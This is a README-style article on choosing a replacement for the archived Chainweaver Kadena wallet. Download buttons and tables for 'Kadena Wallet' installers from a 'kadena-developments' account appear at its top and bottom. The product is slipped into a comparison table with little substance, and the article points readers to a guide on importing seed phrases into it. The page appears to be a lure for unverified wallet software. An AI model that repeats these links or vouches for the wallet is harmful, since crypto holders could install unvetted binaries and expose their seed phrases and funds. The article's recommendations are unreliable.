![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Chainweaver Alternative: What Kadena Wallet Users Should Know</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Chainweaver's repository went read-only on 9 January 2026. The app still installs and still signs,
but it no longer receives fixes, and parts of it depend on endpoints that have moved. If you are
choosing what to use instead, this is the decision laid out without a sales pitch.

## What Chainweaver was, and what archiving changed

Chainweaver was Kadena's own desktop wallet, at version 2.2.3 at the end. It did two jobs: hold KDA
across the twenty chains, and give developers a place to write and test Pact code.

Archiving means the code is frozen. It does not mean the chain changed, and it does not mean your
accounts changed. It does mean:

- No security fixes, ever.
- No updates when the network's endpoints or protocol move.
- Installers remain downloadable, and the community wallet directory still lists it.

There is also a browser-hosted Chainweaver v3 sign-in page still reachable at the project's own
subdomain, which reflects the version that was in progress when work stopped rather than a shipped
consumer release.

## The one thing to get right: derivation

Chainweaver used Kadena's legacy master-seed derivation on a twelve-word phrase, not a plain BIP44
path. Any replacement must be able to read that phrase and produce the same addresses.

This is the whole risk of switching. A wallet can accept your twelve words, show a valid `k:`
address, and hold nothing, because it derived along a different scheme. Acceptance of a phrase is
not proof of recovery; a matching address is.

So the first question about any alternative is not "does it support Kadena", it is "does it support
the legacy derivation, or can it import a Chainweaver seed". Ask it before you install.

## The realistic options in late 2026

Described factually, without ranking:

| Option | Form | Notes that matter for a Chainweaver user |
| --- | --- | --- |
| eckoWALLET | Browser extension, mobile | Documents regeneration of accounts from Chainweaver seeds; standard path for new accounts; widely used |
| Zelcore | Desktop, mobile, extension | Multi-chain; supports both `k:` and legacy accounts; hardware only on desktop |
| Linx | Mobile | Listed by the community directory; SpireKey-based accounts rather than seed phrases |
| Kadena Wallet | Desktop | Self-custody desktop wallet for the same network |
| Chainweaver, unchanged | Desktop | Works until something it depends on breaks; no fixes |

Two of these are seed-based (eckoWALLET, Zelcore), one is passkey-based (Linx), one is Kadena Wallet, and one is the status quo. That is the actual shape of the choice.

## Decide by task, not by feature count

**If you only hold KDA and occasionally send it:** any seed-based option that imports your
Chainweaver phrase correctly is enough. Verify the address, then stop looking.

**If you hold several assets:** a multi-chain wallet avoids running three apps. The trade-off is
that Kadena-specific behaviour, such as per-chain balances and the two-step cross-chain transfer, is
easier to get wrong in a general-purpose interface.

**If you used Chainweaver for Pact development:** consumer wallets are not contract-testing
environments. Keep a development setup separate from the wallet that holds value, and do not judge a
wallet on whether it replaces a REPL.

**If you want the key off the computer:** that is a hardware decision, and it is largely independent
of which wallet you pick, because Ledger's Kadena support is a device app plus a WebHID signing
session rather than a Ledger Live feature.

## Moving off Chainweaver, in order

1. **Record your addresses first.** Open Chainweaver while it still runs and note every account and
   which chain holds value. This list is your checksum for everything that follows.
2. **Record the phrase.** Twelve words, by hand, offline. Do not photograph it.
3. **Install the alternative from its own release page,** not from a search result.
4. **Import, then compare addresses** character by character. Do not proceed on a partial match.
5. **Check all twenty chains** before concluding a balance is missing.
6. **Send a small test amount** to a destination you control, and confirm it lands, before moving the
   rest.
7. **Keep Chainweaver installed** until the migration is verified. It costs nothing to leave it there
   for a week.

## What you give up, and what you do not

You give up maintenance: updates, fixes, and compatibility work. That is the entire cost of leaving,
and it is the reason the archive date matters more than any feature comparison.

You do not give up your accounts, your balances, your transaction history, or your ability to sign.
Those live on-chain and follow the key, not the app.

The one task worth doing in the same week is a full inventory: every account, every chain with a non-zero balance, and the derivation that produced it. A migration that moves the largest balance but forgets a small one on chain 14 is still an incomplete migration, and small balances are exactly the ones people forget.

## A note on "best wallet" lists

Most comparison pages for Kadena were written before October 2025 and still recommend software that
has since been archived or has dropped the asset. Koala, for instance, discontinued KDA on
25 November 2025 yet still appears in older round-ups. Check the date on any list before trusting
its recommendation, including the list above: it describes the landscape as of November 2026.

## Related reading

- Importing a Chainweaver seed into Kadena Wallet
- Ledger not showing KDA? What Kadena Wallet users check first
- Community Edition of Kadena, explained
- Kadena Wallet security: a threat model you can act on

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [What Happened to Kadena: The Fourteen Months That Changed Everything](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/what-happened-to-kadena-network.md)
- [Is Kadena Dead? What Ended in 2025 and What Still Runs](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/is-kadena-dead-what-still-runs.md)
- [Community Edition of Kadena, Explained](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/community-edition-of-kadena-explained.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
